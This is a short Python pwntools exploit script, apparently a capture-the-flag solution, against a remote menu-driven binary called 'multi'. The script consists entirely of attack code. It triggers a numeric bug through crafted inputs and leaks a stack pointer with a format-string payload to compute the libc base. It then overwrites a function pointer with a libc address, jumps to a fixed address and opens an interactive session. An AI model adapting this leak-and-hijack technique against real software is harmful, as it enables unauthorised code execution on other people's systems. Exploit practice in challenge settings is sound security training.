from pwn import *

r = remote("35.198.113.131", 31337)
# r = process("./multi")

r.sendlineafter("numbers: ", "-2 1335")
for i in range(20):
	r.sendlineafter(">> ", "2")
	r.sendlineafter("inclusive: ", "250")
	print i,


r.sendlineafter(">> ", "2")
r.sendlineafter("inclusive: ", "1")
r.sendlineafter(">> ", "1")
r.sendlineafter("inclusive: ", "250")
sleep(3)
log.info("ok")
for i in range(41):
	r.sendlineafter(">> ", "2")
	r.sendlineafter("inclusive: ", "250")
	print i,
print

r.sendlineafter("yourself: ", "%39$p")
r.recvuntil("are a \n\t")
libc = int(r.recvuntil("\n", drop=True), 16) - 0xf0 - 0x20740
log.info("libc : " + hex(libc))
r.sendlineafter("function", `libc + 0x6f690`)

r.sendlineafter(">>", "1")
r.sendlineafter(">>", "2")
r.sendlineafter(">>", "3")
r.sendlineafter("0xcafebabe: ", `0x40162e`)
r.sendlineafter(">>", "4")

r.interactive()